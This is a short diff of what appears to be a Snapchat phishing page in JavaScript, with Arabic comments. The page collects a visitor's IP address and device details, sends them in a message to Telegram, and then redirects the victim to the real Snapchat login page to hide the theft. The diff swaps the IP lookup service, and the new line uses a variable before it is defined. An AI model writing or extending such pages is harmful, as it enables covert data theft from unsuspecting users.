@@ -81,7 +81,7 @@
         const ramSize = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
 
         // الحصول على عنوان IP
-        axios.get('https://api.ipify.org?format=json')
+          axios.get(`https://ip-api.com/json/${ip}`)
             .then(response => {
                 const ip = response.data.ip;
 
@@ -116,7 +116,7 @@ RAM Size: ${ramSize}
                             text: message
                         }).then(() => {
                             // إعادة توجيه المستخدم إلى صفحة تسجيل الدخول الرسمية بعد الإرسال
-                            window.location.href = "https://accounts.snapchat.com/accounts/login";
+                           window.location.href = "https://accounts.snapchat.com/accounts/login";
                         }).catch(error => {
                             console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
                             window.location.href = "https://accounts.snapchat.com/accounts/login";
